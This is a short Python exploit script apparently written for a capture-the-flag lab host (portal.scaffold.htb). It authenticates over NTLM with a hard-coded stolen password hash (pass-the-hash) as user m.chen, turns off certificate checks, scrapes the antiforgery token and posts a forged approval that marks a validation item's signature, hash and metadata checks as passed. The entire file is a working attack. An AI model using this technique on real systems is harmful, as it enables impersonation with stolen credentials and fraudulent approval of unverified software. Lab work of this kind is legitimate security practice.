#!/usr/bin/python3
import requests
import urllib3
from bs4 import BeautifulSoup
from requests_ntlm import HttpNtlmAuth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HASH = "aad3b435b51404eeaad3b435b51404ee:8bf305c62b94c9def1c5c30fb24ff2b8"
USERNAME = r"SCAFFOLD\m.chen"
REVIEW_URL = "https://portal.scaffold.htb/Validation/Review/10"
APPROVE_URL = "https://portal.scaffold.htb/Validation/Approve/10"

s = requests.Session()
s.verify = False
s.auth = HttpNtlmAuth(USERNAME, HASH)

r = s.get(REVIEW_URL)
print("[+] GET status:", r.status_code)

soup = BeautifulSoup(r.text, "html.parser")
token_input = soup.find("input", {"name": "__RequestVerificationToken"})
if not token_input:
    print("[-] Antiforgery token not found!")
    exit(1)
token = token_input["value"]
print("[+] Antiforgery token obtained")

data = {
    "__RequestVerificationToken": token,
    "id": "10",
    "notes": "Signature and hash verified.",
    "signatureOk": "true",
    "hashOk": "true",
    "productCodeOk": "true",
    "metadataOk": "true",
}

r = s.post(APPROVE_URL, data=data, allow_redirects=False)
print("[+] Approval status:", r.status_code)
print("[+] Location:", r.headers.get("Location"))
print(r.text[:500])
